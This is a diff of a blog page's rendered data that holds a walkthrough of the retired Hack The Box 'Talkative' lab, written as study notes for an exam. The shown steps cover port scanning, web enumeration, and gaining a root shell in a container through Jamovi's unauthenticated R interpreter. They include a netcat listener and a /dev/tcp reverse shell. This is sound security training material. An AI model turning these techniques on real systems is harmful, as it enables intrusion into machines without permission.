@@ -1,52 +1,52 @@
 1:"$Sreact.fragment"
 2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 3:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
-1c:I[484,[],"OutletBoundary"]
-1d:"$Sreact.suspense"
+1d:I[484,[],"OutletBoundary"]
+1e:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-talkative-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Talkative Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Talkative machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:10:29.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[20," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-talkative-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Talkative machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Talkative machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/talkative","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","mindset-and-methodology",{"children":["$","a",null,{"href":"#mindset-and-methodology","children":"Mindset & Methodology"}]}],["$","li","step-1-reconnaissance-nmap",{"children":["$","a",null,{"href":"#step-1-reconnaissance-nmap","children":"Step 1: Reconnaissance — Nmap"}]}],["$","li","step-2-web-enumeration",{"children":["$","a",null,{"href":"#step-2-web-enumeration","children":"Step 2: Web Enumeration"}]}],["$","li","step-3-jamovi-rce-shell-in-container-1",{"children":["$","a",null,{"href":"#step-3-jamovi-rce-shell-in-container-1","children":"Step 3: Jamovi RCE — Shell in Container 1"}]}],["$","li","step-4-credential-extraction-from-omv-file",{"children":["$","a",null,{"href":"#step-4-credential-extraction-from-omv-file","children":"Step 4: Credential Extraction from .omv File"}]}],"$L4","$L5","$L6","$L7","$L8","$L9","$La","$Lb","$Lc","$Ld","$Le"]}]]}],"$Lf"],"$L10","$L11",["$L12","$L13","$L14"]]}],"$L15"]}]]}],"$L16"]}],"$L17","$L18"],null,"$L19"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","li","step-5-bolt-cms-code-execution-shell-in-container-2",{"children":["$","a",null,{"href":"#step-5-bolt-cms-code-execution-shell-in-container-2","children":"Step 5: Bolt CMS Code Execution — Shell in Container 2"}]}]
-5:["$","li","step-6-ssh-pivot-to-host-user-flag",{"children":["$","a",null,{"href":"#step-6-ssh-pivot-to-host-user-flag","children":"Step 6: SSH Pivot to Host — User Flag"}]}]
-6:["$","li","step-7-docker-network-enumeration",{"children":["$","a",null,{"href":"#step-7-docker-network-enumeration","children":"Step 7: Docker Network Enumeration"}]}]
-7:["$","li","step-8-chisel-tunnel-to-mongodb",{"children":["$","a",null,{"href":"#step-8-chisel-tunnel-to-mongodb","children":"Step 8: Chisel Tunnel to MongoDB"}]}]
-8:["$","li","step-9-rocket-chat-admin-takeover-via-mongodb",{"children":["$","a",null,{"href":"#step-9-rocket-chat-admin-takeover-via-mongodb","children":"Step 9: Rocket.Chat Admin Takeover via MongoDB"}]}]
-9:["$","li","step-10-rocket-chat-webhook-rce-shell-in-container-3",{"children":["$","a",null,{"href":"#step-10-rocket-chat-webhook-rce-shell-in-container-3","children":"Step 10: Rocket.Chat Webhook RCE — Shell in Container 3"}]}]
-a:["$","li","step-11-container-escape-via-cap-dac-read-search",{"children":["$","a",null,{"href":"#step-11-container-escape-via-cap-dac-read-search","children":"Step 11: Container Escape via CAP_DAC_READ_SEARCH"}]}]
-b:["$","li","step-12-root-flag",{"children":["$","a",null,{"href":"#step-12-root-flag","children":"Step 12: Root Flag"}]}]
-c:["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]
-d:["$","li","key-lessons-and-hacker-mindset-summary",{"children":["$","a",null,{"href":"#key-lessons-and-hacker-mindset-summary","children":"Key Lessons & Hacker Mindset Summary"}]}]
-e:["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]
-f:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",16," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","mindset-and-methodology",{"children":["$","a",null,{"href":"#mindset-and-methodology","children":"Mindset & Methodology"}]}],["$","li","step-1-reconnaissance-nmap",{"children":["$","a",null,{"href":"#step-1-reconnaissance-nmap","children":"Step 1: Reconnaissance — Nmap"}]}],["$","li","step-2-web-enumeration",{"children":["$","a",null,{"href":"#step-2-web-enumeration","children":"Step 2: Web Enumeration"}]}],["$","li","step-3-jamovi-rce-shell-in-container-1",{"children":["$","a",null,{"href":"#step-3-jamovi-rce-shell-in-container-1","children":"Step 3: Jamovi RCE — Shell in Container 1"}]}],["$","li","step-4-credential-extraction-from-omv-file",{"children":["$","a",null,{"href":"#step-4-credential-extraction-from-omv-file","children":"Step 4: Credential Extraction from .omv File"}]}],["$","li","step-5-bolt-cms-code-execution-shell-in-container-2",{"children":["$","a",null,{"href":"#step-5-bolt-cms-code-execution-shell-in-container-2","children":"Step 5: Bolt CMS Code Execution — Shell in Container 2"}]}],["$","li","step-6-ssh-pivot-to-host-user-flag",{"children":["$","a",null,{"href":"#step-6-ssh-pivot-to-host-user-flag","children":"Step 6: SSH Pivot to Host — User Flag"}]}],["$","li","step-7-docker-network-enumeration",{"children":["$","a",null,{"href":"#step-7-docker-network-enumeration","children":"Step 7: Docker Network Enumeration"}]}],["$","li","step-8-chisel-tunnel-to-mongodb",{"children":["$","a",null,{"href":"#step-8-chisel-tunnel-to-mongodb","children":"Step 8: Chisel Tunnel to MongoDB"}]}],["$","li","step-9-rocket-chat-admin-takeover-via-mongodb",{"children":["$","a",null,{"href":"#step-9-rocket-chat-admin-takeover-via-mongodb","children":"Step 9: Rocket.Chat Admin Takeover via MongoDB"}]}],["$","li","step-10-rocket-chat-webhook-rce-shell-in-container-3",{"children":["$","a",null,{"href":"#step-10-rocket-chat-webhook-rce-shell-in-container-3","children":"Step 10: Rocket.Chat Webhook RCE — Shell in Container 3"}]}],["$","li","step-11-container-escape-via-cap-dac-read-search",{"children":["$","a",null,{"href":"#step-11-container-escape-via-cap-dac-read-search","children":"Step 11: Container Escape via CAP_DAC_READ_SEARCH"}]}],["$","li","step-12-root-flag",{"children":["$","a",null,{"href":"#step-12-root-flag","children":"Step 12: Root Flag"}]}],["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}],["$","li","key-lessons-and-hacker-mindset-summary",{"children":["$","a",null,{"href":"#key-lessons-and-hacker-mindset-summary","children":"Key Lessons & Hacker Mindset Summary"}]}],["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]]}]}]]}]
-10:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3395c117483486553dea92267f83d4f0e9a2bec1/HTB-Talkative.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 3395c1174834",""]}]]]}]
-11:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Talkative"," · Linux"," · Hard"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/talkative","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
-12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Talkative machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"6 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-1a:T96c7,
-<p><strong>Attacker IP:</strong> 10.10.16.84<br /><strong>Target IP:</strong> 10.129.227.113<br /><strong>Difficulty:</strong> Hard<br /><strong>OS:</strong> Linux (Ubuntu 20.04 host + multiple Docker containers)  </p>
-<hr />
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Talkative Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Unauthenticated Jamovi R execution exposed Bolt credentials, Bolt code execution and password reuse reached Saul on the host, then an unauthenticated MongoDB takeover enabled a Rocket.Chat webhook shell whose dangerous capability read the host's root flag."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:10:29.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[20," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-talkative-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Talkative machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Talkative machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/talkative","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-reconnaissance-nmap",{"children":["$","a",null,{"href":"#step-1-reconnaissance-nmap","children":"Step 1: Reconnaissance: Nmap"}]}],["$","li","step-2-web-enumeration",{"children":["$","a",null,{"href":"#step-2-web-enumeration","children":"Step 2: Web Enumeration"}]}],["$","li","step-3-jamovi-rce-shell-in-container-1",{"children":["$","a",null,{"href":"#step-3-jamovi-rce-shell-in-container-1","children":"Step 3: Jamovi RCE: Shell in Container 1"}]}],["$","li","step-4-credential-extraction-from-omv-file",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La","$Lb","$Lc","$Ld","$Le","$Lf"]}]]}],"$L10"],"$L11","$L12",["$L13","$L14","$L15"]]}],"$L16"]}]]}],"$L17"]}],"$L18","$L19"],null,"$L1a"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","a",null,{"href":"#step-4-credential-extraction-from-omv-file","children":"Step 4: Credential Extraction from .omv File"}]
+5:["$","li","step-5-bolt-cms-code-execution-shell-in-container-2",{"children":["$","a",null,{"href":"#step-5-bolt-cms-code-execution-shell-in-container-2","children":"Step 5: Bolt CMS Code Execution: Shell in Container 2"}]}]
+6:["$","li","step-6-ssh-pivot-to-host-user-flag",{"children":["$","a",null,{"href":"#step-6-ssh-pivot-to-host-user-flag","children":"Step 6: SSH Pivot to Host: User Flag"}]}]
+7:["$","li","step-7-docker-network-enumeration",{"children":["$","a",null,{"href":"#step-7-docker-network-enumeration","children":"Step 7: Docker Network Enumeration"}]}]
+8:["$","li","step-8-chisel-tunnel-to-mongodb",{"children":["$","a",null,{"href":"#step-8-chisel-tunnel-to-mongodb","children":"Step 8: Chisel Tunnel to MongoDB"}]}]
+9:["$","li","step-9-rocket-chat-admin-takeover-via-mongodb",{"children":["$","a",null,{"href":"#step-9-rocket-chat-admin-takeover-via-mongodb","children":"Step 9: Rocket.Chat Admin Takeover via MongoDB"}]}]
+a:["$","li","step-10-rocket-chat-webhook-rce-shell-in-container-3",{"children":["$","a",null,{"href":"#step-10-rocket-chat-webhook-rce-shell-in-container-3","children":"Step 10: Rocket.Chat Webhook RCE: Shell in Container 3"}]}]
+b:["$","li","step-11-container-escape-via-cap-dac-read-search",{"children":["$","a",null,{"href":"#step-11-container-escape-via-cap-dac-read-search","children":"Step 11: Container Escape via CAP_DAC_READ_SEARCH"}]}]
+c:["$","li","step-12-root-flag",{"children":["$","a",null,{"href":"#step-12-root-flag","children":"Step 12: Root Flag"}]}]
+d:["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}]
+e:["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key lessons"}]}]
+f:["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]
+10:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",16," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-reconnaissance-nmap",{"children":["$","a",null,{"href":"#step-1-reconnaissance-nmap","children":"Step 1: Reconnaissance: Nmap"}]}],["$","li","step-2-web-enumeration",{"children":["$","a",null,{"href":"#step-2-web-enumeration","children":"Step 2: Web Enumeration"}]}],["$","li","step-3-jamovi-rce-shell-in-container-1",{"children":["$","a",null,{"href":"#step-3-jamovi-rce-shell-in-container-1","children":"Step 3: Jamovi RCE: Shell in Container 1"}]}],["$","li","step-4-credential-extraction-from-omv-file",{"children":["$","a",null,{"href":"#step-4-credential-extraction-from-omv-file","children":"Step 4: Credential Extraction from .omv File"}]}],["$","li","step-5-bolt-cms-code-execution-shell-in-container-2",{"children":["$","a",null,{"href":"#step-5-bolt-cms-code-execution-shell-in-container-2","children":"Step 5: Bolt CMS Code Execution: Shell in Container 2"}]}],["$","li","step-6-ssh-pivot-to-host-user-flag",{"children":["$","a",null,{"href":"#step-6-ssh-pivot-to-host-user-flag","children":"Step 6: SSH Pivot to Host: User Flag"}]}],["$","li","step-7-docker-network-enumeration",{"children":["$","a",null,{"href":"#step-7-docker-network-enumeration","children":"Step 7: Docker Network Enumeration"}]}],["$","li","step-8-chisel-tunnel-to-mongodb",{"children":["$","a",null,{"href":"#step-8-chisel-tunnel-to-mongodb","children":"Step 8: Chisel Tunnel to MongoDB"}]}],["$","li","step-9-rocket-chat-admin-takeover-via-mongodb",{"children":["$","a",null,{"href":"#step-9-rocket-chat-admin-takeover-via-mongodb","children":"Step 9: Rocket.Chat Admin Takeover via MongoDB"}]}],["$","li","step-10-rocket-chat-webhook-rce-shell-in-container-3",{"children":["$","a",null,{"href":"#step-10-rocket-chat-webhook-rce-shell-in-container-3","children":"Step 10: Rocket.Chat Webhook RCE: Shell in Container 3"}]}],["$","li","step-11-container-escape-via-cap-dac-read-search",{"children":["$","a",null,{"href":"#step-11-container-escape-via-cap-dac-read-search","children":"Step 11: Container Escape via CAP_DAC_READ_SEARCH"}]}],["$","li","step-12-root-flag",{"children":["$","a",null,{"href":"#step-12-root-flag","children":"Step 12: Root Flag"}]}],["$","li","full-attack-chain-summary",{"children":["$","a",null,{"href":"#full-attack-chain-summary","children":"Full Attack Chain Summary"}]}],["$","li","key-lessons",{"children":["$","a",null,{"href":"#key-lessons","children":"Key lessons"}]}],["$","li","tools-used",{"children":["$","a",null,{"href":"#tools-used","children":"Tools Used"}]}]]}]}]]}]
+11:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/3395c117483486553dea92267f83d4f0e9a2bec1/HTB-Talkative.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 3395c1174834",""]}]]]}]
+12:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Talkative, Linux, Hard",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/talkative","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
+13:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Talkative machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+14:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+15:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"6 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+1b:T911b,<p><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.227.113<br><strong>Difficulty:</strong> Hard<br><strong>OS:</strong> Linux (Ubuntu 20.04 host + multiple Docker containers)  </p>
+<hr>
 
 
 
-<h2 id="mindset-and-methodology">Mindset &amp; Methodology</h2>
-<p>Before touching the target, understand how experienced hackers approach a box:</p>
+<h2 id="attack-chain">Attack chain</h2>
+<p>Talkative crosses applications, containers, and the host:</p>
 <ul>
 <li><strong>Enumerate everything before exploiting anything.</strong> Rushing to exploit the first thing you find wastes time. Map the full attack surface first.</li>
-<li><strong>Follow the application logic.</strong> Applications leave clues — product names, usernames, error messages — that point to the next step.</li>
-<li><strong>Pivot mindset.</strong> On a Hard box, you rarely go straight from external to root. Expect multiple hops: external → container → host → another container → host root.</li>
+<li><strong>Follow the application logic.</strong> Applications leave clues - product names, usernames, error messages - that point to the next step.</li>
+<li><strong>Pivot plan.</strong> On a Hard box, you rarely go straight from external to root. Expect multiple hops: external → container → host → another container → host root.</li>
 <li><strong>Credentials reuse everywhere.</strong> Any password you find should be tried on every service available.</li>
-<li><strong>Containers are not the end.</strong> Getting root inside a Docker container is not the goal — escaping to the host is.</li>
+<li><strong>Containers are not the end.</strong> Getting root inside a Docker container is not the goal - escaping to the host is.</li>
 </ul>
-<hr />
-<h2 id="step-1-reconnaissance-nmap">Step 1: Reconnaissance — Nmap</h2>
-<h3 id="what-we-do">What we do</h3>
+<hr>
+<h2 id="step-1-reconnaissance-nmap">Step 1: Reconnaissance: Nmap</h2>
+
 <pre><code class="language-bash" data-language="bash"># First, add the target to /etc/hosts so we can use the hostname
 echo "10.129.227.113 talkative.htb" | sudo tee -a /etc/hosts
 
 # Full port scan with service/version detection and default scripts
 nmap -p 22,80,3000,8080,8081,8082 -sCV 10.129.227.113
 </code></pre>
-<h3 id="why-we-do-it">Why we do it</h3>
+
 <p>Nmap is our first tool for every engagement. It tells us:</p>
 <ul>
 <li>Which ports are open (attack surface)</li>
@@ -62,16 +62,16 @@ nmap -p 22,80,3000,8080,8081,8082 -sCV 10.129.227.113
 8081/tcp open      Tornado httpd 5.0 (404)
 8082/tcp open      Tornado httpd 5.0 (404)
 </code></pre>
-<h3 id="hacker-mindset">Hacker mindset</h3>
+
 <ul>
-<li><strong>Port 22 is filtered</strong> — SSH is blocked from the outside. This tells us we can't brute-force SSH externally. We'll need to find a way in through the web services first.</li>
-<li><strong>Three separate web services</strong> — port 80, 3000, and 8080 each run completely different applications. Each is a potential attack vector.</li>
-<li><strong>8081/8082 returning 404</strong> — these are likely related to Jamovi (same Tornado framework). Not immediately useful, but noted.</li>
-<li><strong>Apache/2.4.52 on Debian</strong> — the Apache version leaks the underlying OS, helping us narrow down exploit compatibility later.</li>
+<li><strong>Port 22 is filtered</strong> : SSH is blocked from the outside. This tells us we can't brute-force SSH externally. We'll need to find a way in through the web services first.</li>
+<li><strong>Three separate web services</strong> : port 80, 3000, and 8080 each run completely different applications. Each is a potential attack vector.</li>
+<li><strong>8081/8082 returning 404</strong> : these are likely related to Jamovi (same Tornado framework). Not immediately useful, but noted.</li>
+<li><strong>Apache/2.4.52 on Debian</strong> : the Apache version leaks the underlying OS, helping us narrow down exploit compatibility later.</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-2-web-enumeration">Step 2: Web Enumeration</h2>
-<h3 id="port-80-bolt-cms">Port 80 — Bolt CMS</h3>
+<h3 id="port-80-bolt-cms">Port 80: Bolt CMS</h3>
 <p>Browse to <code>http://talkative.htb</code>. You'll see a corporate website for a communications company. Key things to notice:</p>
 <ul>
 <li>The "Our People" section lists employees with emails:<ul>
@@ -84,22 +84,22 @@ nmap -p 22,80,3000,8080,8081,8082 -sCV 10.129.227.113
 <li>The footer error when submitting the contact form reveals <strong>Bolt CMS</strong> is in use</li>
 <li>The Bolt admin panel lives at <code>http://talkative.htb/bolt</code></li>
 </ul>
-<h3 id="port-3000-rocket-chat">Port 3000 — Rocket.Chat</h3>
+<h3 id="port-3000-rocket-chat">Port 3000: Rocket.Chat</h3>
 <p>Browse to <code>http://talkative.htb:3000</code>. You'll find a Rocket.Chat login page. You can register an account to look around, but without admin credentials there's little to do. Note the admin username is <strong>saul</strong>.</p>
-<h3 id="port-8080-jamovi">Port 8080 — Jamovi</h3>
-<p>Browse to <code>http://talkative.htb:8080</code>. This is a Jamovi statistical analysis tool — and crucially, <strong>it requires no authentication</strong>. Jamovi itself warns you it's running an outdated version with known security vulnerabilities.</p>
-<h3 id="hacker-mindset-2">Hacker mindset</h3>
+<h3 id="port-8080-jamovi">Port 8080: Jamovi</h3>
+<p>Browse to <code>http://talkative.htb:8080</code>. This is a Jamovi statistical analysis tool - and crucially, <strong>it requires no authentication</strong>. Jamovi itself warns you it's running an outdated version with known security vulnerabilities.</p>
+
 <ul>
 <li><strong>Employee names = potential usernames.</strong> These three email addresses will be credential candidates everywhere.</li>
 <li><strong>Product mentions = attack surface hints.</strong> The website literally tells us which software is running. Jamovi on port 8080 and Rocket.Chat on port 3000 are confirmed attack vectors.</li>
-<li><strong>No-auth services are gold.</strong> Jamovi needs no login. That's our lowest-resistance entry point — try it first.</li>
+<li><strong>No-auth services are gold.</strong> Jamovi needs no login. That's our lowest-resistance entry point - try it first.</li>
 <li><strong>CMS admin panels are high-value targets.</strong> Bolt's <code>/bolt</code> login page means if we get credentials, we may get code execution through template/plugin functionality.</li>
 </ul>
-<hr />
-<h2 id="step-3-jamovi-rce-shell-in-container-1">Step 3: Jamovi RCE — Shell in Container 1</h2>
+<hr>
+<h2 id="step-3-jamovi-rce-shell-in-container-1">Step 3: Jamovi RCE: Shell in Container 1</h2>
 <h3 id="background">Background</h3>
-<p>Jamovi is a statistical analysis application that includes an <strong>Rj Editor</strong> — a built-in R language interpreter. R has a <code>system()</code> function that executes OS commands. Since Jamovi runs as root inside a Docker container and has no authentication, we can execute arbitrary OS commands with zero effort.</p>
-<h3 id="what-we-do-2">What we do</h3>
+<p>Jamovi is a statistical analysis application that includes an <strong>Rj Editor</strong> - a built-in R language interpreter. R has a <code>system()</code> function that executes OS commands. Since Jamovi runs as root inside a Docker container and has no authentication, we can execute arbitrary OS commands with zero effort.</p>
+
 <p><strong>Start a listener on Kali:</strong></p>
 <pre><code class="language-bash" data-language="bash">nc -lnvp 443
 </code></pre>
@@ -114,20 +114,20 @@ nmap -p 22,80,3000,8080,8081,8082 -sCV 10.129.227.113
 <ol>
 <li>Press <strong>Ctrl+Shift+Enter</strong> to execute</li>
 </ol>
-<h3 id="why-this-works">Why this works</h3>
-<p>R's <code>system()</code> function passes commands directly to the OS shell. The <code>intern=TRUE</code> parameter captures stdout. We use bash's <code>/dev/tcp</code> pseudo-device to create a TCP connection back to our machine, redirecting stdin/stdout/stderr through it — giving us an interactive shell.</p>
-<h3 id="result">Result</h3>
+
+<p>R's <code>system()</code> function passes commands directly to the OS shell. The <code>intern=TRUE</code> parameter captures stdout. We use bash's <code>/dev/tcp</code> pseudo-device to create a TCP connection back to our machine, redirecting stdin/stdout/stderr through it - giving us an interactive shell.</p>
+
 <pre><code>root@b06821bbda78:/# id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
